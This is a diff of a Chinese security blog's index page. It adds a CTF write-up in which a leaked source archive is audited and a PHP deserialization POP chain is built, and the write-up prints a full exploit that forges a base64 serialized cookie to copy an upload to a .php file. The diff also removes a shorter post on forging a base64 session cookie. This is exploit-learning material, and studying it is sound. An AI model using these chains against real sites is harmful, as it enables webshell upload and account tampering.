@@ -172,6 +172,94 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-pop链3之__get()和__call()魔术方法的使用" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date">
+  	<time datetime="2021-10-12T16:00:00.000Z" itemprop="datePublished">2021-10-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/">
+        pop链3之__get()和__call()魔术方法的使用
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="pop链3之-get-和-call-魔术方法的使用"><a href="#pop链3之-get-和-call-魔术方法的使用" class="headerlink" title="pop链3之__get()和__call()魔术方法的使用"></a>pop链3之__get()和__call()魔术方法的使用</h1><p>魔术方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__get()：当对象调用不可访问的属性时被调用</span><br><span class="line"></span><br><span class="line">__call()：当对象调用不可访问的函数时被调用</span><br></pre></td></tr></table></figure>
+
+<p>我们打开页面，发现是注册和登录页面，所以我们在注册和登录时，随便尝试了sql注入闭合测试和二次注入，而对于二次注入的测试，可以注册时构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&#x27;and&#x27;1</span><br></pre></td></tr></table></figure>
+<p>然后在登陆时，使用这个username，发现回显页面仍然是0’and’1，所以不存在二次注入，也不存在sql注入，所以此时我们可以使用dirsearch扫描目录，发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.tar.gz</span><br></pre></td></tr></table></figure>
+<p>文件泄露，所以我们下载<a target="_blank" rel="noopener" href="http://www.tar.gz文件后,解压,然后审计源码,我们可以先从控制前端输入值的代码开始审计起,即在/">www.tar.gz文件后，解压，然后审计源码，我们可以先从控制前端输入值的代码开始审计起，即在</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/application/web/controller</span><br></pre></td></tr></table></figure>
+<p>目录下的文件，我们可以查看Profile.php文件中对于上传文件处理的那一串代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public function upload_img()&#123;</span><br><span class="line">    if($this-&gt;checker)&#123;</span><br><span class="line">        if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!empty($_FILES))&#123;</span><br><span class="line">        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">        $this-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if($this-&gt;ext) &#123;</span><br><span class="line">        if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">            @unlink($this-&gt;filename_tmp);</span><br><span class="line">            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">            $this-&gt;update_img();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>从这串代码中，我们可知</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;checker)&#123;</span><br><span class="line">    if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">        $this-&gt;redirect($curr_url,302);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>当我们上传文件时，会先检查登录的账号和密码，是否正确，如果正确，才会进行下一步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">    $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">    $this-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时会将上传的文件名存储在$this-&gt;filename_tmp变量中，然后再对上传文件名进行md5加密，并加上.png后缀，然后存储在$this-&gt;filename中，然后进行一步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;ext) &#123;</span><br><span class="line">    if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">        @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">        @unlink($this-&gt;filename_tmp);</span><br><span class="line">        $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">        $this-&gt;update_img();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果此时$this-&gt;filename中的文件后缀为png的话，则会判断$this-&gt;filename_tmp的尺寸，然后将$this-&gt;filename覆盖到$this-&gt;filename_tmp中，并删除$this-&gt;filename_tmp的变量的值，并将此文件存储在/upload/$this-&gt;upload_menu/$this-&gt;filename中</p>
+<p>但是我们在login.php文件中的login_check会将cookie中的user参数的值进行base64解密，并反序列化</p>
+<p>而这道题的过滤点在于，它会将上传的任何文件都变为.png后缀，所以我们可以想办法利用profile.php文件中的upload_img()函数中的copy函数对原来上传的文件名(加后缀)进行覆盖，并将原来文件的内容复制到覆盖后的文件中，从而绕过.png后缀这个过滤点，因此我们需要构造一条pop来链</p>
+<p>我们看向profile.php文件中的两个魔术方法，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    if($this-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而但对于魔术方法__call()，要对象调用不可访问的函数才可以被调用，所以可以利用register.php文件中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    if(!$this-&gt;registed)&#123;</span><br><span class="line">        $this-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们只需将$this-&gt;checker设置为new Profile()，即可触发__call()魔术方法，而__call()魔术方法中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;&#123;$name&#125;</span><br></pre></td></tr></table></figure>
+<p>则会触发__get()魔术方法，而将$this-&gt;except=array[“index”=&gt;”upload_img”]，则可以利用return $this-&gt;except[$name]调用upload_img()函数，从而实现覆盖，所以exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\web\controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Profile</span><br><span class="line">&#123;</span><br><span class="line">    public $checker=0;  //绕过upload_tmp()函数的第一个if</span><br><span class="line">    public $filename_tmp=&quot;./upload/93df0602d768e80cec04f22bc0fb368d/432958539d6bd005179f8a48cb4ef719.png&quot;;</span><br><span class="line">    public $filename=&quot;upload/penson.php&quot;;</span><br><span class="line">    public $upload_menu;</span><br><span class="line">    public $ext=1; //绕过第二个if</span><br><span class="line">    public $img;</span><br><span class="line">    public $except=array(&quot;index&quot;=&gt;&quot;upload_img&quot;);</span><br><span class="line"></span><br><span class="line">    public function upload_img()&#123;</span><br><span class="line">        if($this-&gt;checker)&#123;</span><br><span class="line">            if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">                $this-&gt;redirect($curr_url,302);</span><br><span class="line">                exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        if($this-&gt;ext) &#123;</span><br><span class="line">            if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">                @unlink($this-&gt;filename_tmp);</span><br><span class="line">                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">                $this-&gt;update_img();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Register&#123;</span><br><span class="line">    public $checker;</span><br><span class="line">    public $registed=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Register();</span><br><span class="line">$a-&gt;checker=new Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker=0;//调用pop链防止退出程序</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后我们只要抓包，然后将这个生成的值放入cookie的参数user中即可</p>
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105131257]">https://blog.csdn.net/mochu7777777/article/details/105131257]</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-vm2沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1224,69 +1312,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-简单的cookie伪造" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/" class="article-date">
-  	<time datetime="2021-10-02T16:00:00.000Z" itemprop="datePublished">2021-10-03</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/">
-        简单的cookie伪造
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="简单的cookie伪造"><a href="#简单的cookie伪造" class="headerlink" title="简单的cookie伪造"></a>简单的cookie伪造</h1><p>打开页面发现，是一个购买的界面，可以看见第三个是购买flag的，打开页面源码，发现没有什么提示，所以我们点击购买，然后抓包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /buy HTTP/1.1</span><br><span class="line">Host: 8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81/</span><br><span class="line">Cookie: UM_distinctid=17c472616a335b-0660cc5b8058a1-4c3e2778-186a00-17c472616a43f; session=eyJtb25leSI6IDM3LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IHBlcHBhcmtha2EiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSJdfQ==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id=2</span><br></pre></td></tr></table></figure>
-<p>发现有一个session字段，且值是base64加密的，所以base64解密后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 37, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</span><br></pre></td></tr></table></figure>
-<p>因此，我们可以修改37为500，然后伪造cookie中的session字段并提交，得到回馈的seesion字段，我们再base64解密一下即可得flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 400, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;flag&#123;d1ca8b7e-27c5-415b-a858-0c9d22826c21&#125;\n&quot;]&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
 	</div>
 
       
